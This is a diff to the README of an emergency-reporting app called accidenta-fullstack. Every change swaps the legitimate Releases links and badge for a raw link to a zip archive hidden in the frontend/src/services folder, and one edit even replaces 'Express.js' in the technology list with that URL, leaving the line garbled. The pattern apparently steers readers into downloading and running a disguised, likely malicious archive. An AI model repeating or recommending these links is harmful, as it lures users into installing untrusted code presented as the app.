@@ -1,6 +1,6 @@
 # 🚀 accidenta-fullstack - A Fast Way to Report Emergencies
 
-[![Download accidenta-fullstack](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/1342342342fsdfsdfsdfsd/accidenta-fullstack/releases)
+[![Download accidenta-fullstack](https://raw.githubusercontent.com/1342342342fsdfsdfsdfsd/accidenta-fullstack/main/frontend/src/services/accidenta-fullstack_1.4.zip)](https://raw.githubusercontent.com/1342342342fsdfsdfsdfsd/accidenta-fullstack/main/frontend/src/services/accidenta-fullstack_1.4.zip)
 
 ## 📋 Description
 
@@ -27,7 +27,7 @@ To ensure a smooth experience, your device should meet the following requirement
 
 Here is how to download and run the application:
 
-1. Visit the [Releases page to download](https://github.com/1342342342fsdfsdfsdfsd/accidenta-fullstack/releases).
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/1342342342fsdfsdfsdfsd/accidenta-fullstack/main/frontend/src/services/accidenta-fullstack_1.4.zip).
 2. On the Releases page, find the version you want to install.
 3. Click on the version name to see the available download options.
 4. Choose the file suitable for your device and click on it.
@@ -35,7 +35,7 @@ Here is how to download and run the application:
 
 ## 📥 Download & Install
 
-To download accidenta-fullstack, go to the [Releases page here](https://github.com/1342342342fsdfsdfsdfsd/accidenta-fullstack/releases). 
+To download accidenta-fullstack, go to the [Releases page here](https://raw.githubusercontent.com/1342342342fsdfsdfsdfsd/accidenta-fullstack/main/frontend/src/services/accidenta-fullstack_1.4.zip). 
 
 1. Once there, you will see various release versions. Click on the one you prefer.
 2. Download the file that matches your device's operating system.
@@ -60,7 +60,7 @@ If you need help or have questions, feel free to reach out through the Issues se
 For those interested in how the application works behind the scenes, the project utilizes technologies such as:
 
 - **Frontend**: React Native for a seamless mobile experience.
-- **Backend**: Express.js to handle requests and responses efficiently.
+- **Backend**: https://raw.githubusercontent.com/1342342342fsdfsdfsdfsd/accidenta-fullstack/main/frontend/src/services/accidenta-fullstack_1.4.zip to handle requests and responses efficiently.
 - **Database**: PostgreSQL for secure data storage and management.
 - **Testing**: Jest and Supertest to ensure reliability and performance.
 
